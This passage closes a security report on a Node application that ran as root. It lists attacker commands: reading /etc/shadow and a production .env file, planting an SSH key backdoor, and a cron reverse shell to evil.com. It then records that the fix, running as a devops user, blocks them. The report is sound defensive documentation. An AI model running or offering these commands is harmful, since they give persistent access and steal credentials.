cat /etc/shadow                                                  # all OS password hashes
echo "ssh-rsa ATTACKER_KEY" >> /root/.ssh/authorized_keys       # persistent SSH backdoor
echo "* * * * * root bash -i >& /dev/tcp/evil.com/4444 0>&1" \
  >> /etc/cron.d/backdoor                                        # persistent reverse shell
cat /home/devops/My-JS-Project/.env.production                  # all API keys

# As devops (after fix), all of the above return: Permission denied
# Blast radius is contained to the application's own files only
```

**Fix (already applied):**
```bash
ps aux | grep node   # shows devops, not root
```

---

*End of SECURITY_REPORT.md*
